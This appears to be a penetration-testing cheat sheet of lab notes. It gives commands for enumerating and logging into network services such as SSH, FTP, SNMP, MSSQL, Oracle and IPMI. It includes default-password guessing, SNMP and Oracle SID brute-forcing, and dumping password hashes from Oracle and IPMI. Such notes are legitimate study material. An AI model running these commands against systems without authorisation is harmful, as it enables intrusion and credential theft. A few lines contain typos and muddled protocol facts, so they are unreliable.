# **Services**

## **Principles**

| No.      | Principle                          |
| ----------- | ------------------------------------ |
| `1`       | There is more than meets the eye. Consider all points of view.  |
| `2`       | Distinguish between what we see and what we do not see. |
| `3`    | There are always ways to gain more information. Understand the target |


## **Services**
!!! tip "Default Passwords"

    Try out known default passwords for ANY services that we discover, as these are often left unchanged and can lead to quick wins.

### <span class="red-command">SSH</span>
Configuration file stored at - <code class="invert">/etc/ssh/sshd_config</code>

```
ssh -v r3dp4rrot@<server_ip> -o PreferredAuthentications=password
```

### <span class="red-command">RDP</span>
Fingerprinting RDP via nmap
```
nmap -sV -sC <server_ip> -p3389 --script rdp*
```

Initiate an RDP Session
```
xfreerdp /u:<user> /p:"<pass>" /v:<rdp_server_ip>
```

### <span class="red-command">WinRM</span>
WinRM relies on TCP ports `5985` and `5986` for communication, with the last port `5986 using HTTPS`.

```
evil-winrm -i <server_ip> -u <user> -p <password>
```

### <span class="red-command">FTP</span>
Control channel on TCP port 21.  
Data transfer channel on TCP port 20.  
File Transfer Protocol (TFTP) uses TCP.  
Trivial File Transfer Protocol (TFTP) uses UDP.  

Configuration file stored at - <code class="invert">/etc/vsftpd.conf</code>  
Connecting to an FTP server and getting the server settings.
```
ftp <server_ip>
> status
```

Recursive directory listing
```
> ls -R
```

Download a file from the ftp server
```
> get Flags\ flag.txt
OR 
> cd Flags
> mget flag.txt
```

Upload a file to the ftp server
```
> put some.exe
```

Connecting to the FTP server using netcat
```
nc -nv <server_ip> 21
```

Connecting to the FTP server using telnet
```
telnet <server_ip> 21
```

Connect to a TLS enabled FTP server
```
openssl s_client -connect <server_ip>:21 -starttls ftp
```

### <span class="red-command">SMB</span>
Samba server listens on TCP ports `137, 138, 139`, but CIFS uses TCP port `445` only.  
Configuration file stored at - <code class="invert">/etc/samba/smb.conf</code>

### <span class="red-command">NFC</span>


### <span class="red-command">DNS</span>

[`Learn how to configure a DNS server`](https://wiki.debian.org/Bind9#Introduction){target=_blank}

### <span class="red-command">SMTP</span>

### <span class="red-command">IMPA/POP3</span>

```
# List all the INBOXs
curl -k --url 'imaps://10.129.92.23' --user username:passwd -X 'LIST "" *'

# Select the INBOX
curl -k --url 'imaps://10.129.92.23' --user username:passwd -X 'SELECT "INBOX_NAME"'
OR
curl -k --url 'imaps://10.129.92.23/INBOX_NAME' --user username:passwd
```

```
curl -v -k --url 'imaps://10.129.92.23/$MAILBOX' --user 'username:passwd' -X 'FETCH 1 BODY[]'
```

```
# connect to IMAP via SSL/TLS
openssl s_client -connect 10.129.14.128:imaps

# connect to POP3 via SSL/TLS
openssl s_client -connect 10.129.14.128:pop3s

```

### <span class="red-command">SNMP</span>
[`Learn how to configure an SNMP daemon`](http://www.net-snmp.org/docs/man/snmpd.conf.html)

```
# bruteforcing community strings
onesixtyone -c /opt/SecLists/Discovery/SNMP/snmp-onesixtyone.txt <server_ip>

# Bruteforcing oids with braa
braa public@<server_ip>:.1.3.6.*

snmpwalk -v2c -c <community_str> <server_ip>
```

### <span class="red-command">MySQL</span>
The configuration files of MySQL server are loacted at - `/etc/mysql/mysql.conf.d/mysqld.cnf`
```
# connect to a MySQL server using creds
mysql -u username -pPassword -h <server_ip>
```

### <span class="red-command">MSSQL</span>
Footprinting the MSSQL service using Nmap
```
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.3.154
```

Ping the MSSQL server using Metasploit
```
msfconsole
> use use auxiliary/scanner/mssql/mssql_ping
> set rhosts <mssql_server_ip>
```

Connect to MSSQL Server using Impacket's mssqlclient.py script
```
python3 examples/mssqlclient.py username@<mssql_server_ip> -windows-auth
```

### <span class="red-command">Oracle TNS</span>
Bruteforcing SIDs using nmap
```
nmap <oracle_db_ip> -p1521 -sCV --script oracle-sid-brute
```

Enumerating the oracle TNS using odat.py
```
python3 ./odat.py all -s <oracle_db_ip>
```

Get auth credentials using the obtained SID
```
python3 ./odat.py all -s <oracle_db_ip> -d <SID>
```

Attempting to login as sysdba via obtained credentials
```
sqlplus <user>/<pass>@<oracle_db_ip>/XE as sysdba
```

Getting password hashes from the connected DB
```
SQL> select name, password from sys.user$;
```

### <span class="red-command">IPMI</span>
IPMI communicates over port `623 UDP`.  
Systems that use the IPMI protocol are called `Baseboard Management Controllers (BMCs)`. BMCs are typically implemented as embedded ARM systems running Linux, and connected directly to the host's motherboard. BMCs are built into many motherboards but can also be added to a system as a PCI card.  

If we can access a BMC during an assessment, we would gain full access to the host motherboard and be able to monitor, reboot, power off, or even reinstall the host operating system. <code class="invert">Gaining access to a BMC is nearly equivalent to physical access to a system</code>. Many BMCs (including HP iLO, Dell DRAC, and Supermicro IPMI) expose a web-based management console, some sort of command-line remote access protocol such as Telnet or SSH, and the port 623 UDP, which, again, is for the IPMI network protocol. 

Fingerprinting the service running on UDP port 623.
```
sudo nmap -sU --script ipmi-version -p 623 <subdomain>
```

Metasploit version scan
```
msfconsole
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts <server_ip>
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options
msf6 auxiliary(scanner/ipmi/ipmi_version) > run
```

Obtain the password hash for ANY valid user account on the BMC via [`Metasploit`](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/){target=_blank}.
```
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) >> set PASS_FILE /opt/SecLists/Passwords/bt4-password.txt
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
```


